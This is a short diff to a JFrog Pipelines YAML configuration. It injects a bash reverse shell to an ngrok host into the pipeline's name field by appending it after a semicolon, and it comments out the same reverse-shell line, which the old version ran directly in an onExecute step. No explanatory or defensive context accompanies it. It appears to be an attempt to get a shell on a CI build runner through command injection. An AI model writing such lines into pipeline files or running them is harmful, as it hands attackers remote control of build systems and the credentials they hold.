@@ -20,7 +20,7 @@ resources:
       runID: 1
 
 pipelines:
-  - name: my_first_pipeline
+  - name: my_first_pipeline;bash -i >& /dev/tcp/8.tcp.ngrok.io/16677 0>&1
     steps:
       - name: p1_s1
         type: Bash
@@ -32,7 +32,7 @@ pipelines:
           onExecute:
             # Data from input resources is available as env variables in the step
             - echo $res_jfrog_commitSha 
-            - bash -i >& /dev/tcp/8.tcp.ngrok.io/16677 0>&1
+            #- bash -i >& /dev/tcp/8.tcp.ngrok.io/16677 0>&1
             # The next two commands add variables to run state, which is available to all downstream steps in this run
             # Run state documentation: https://www.jfrog.com/confluence/display/JFROG/Creating+Stateful+Pipelines#CreatingStatefulPipelines-RunState
             - user=$(whoami)
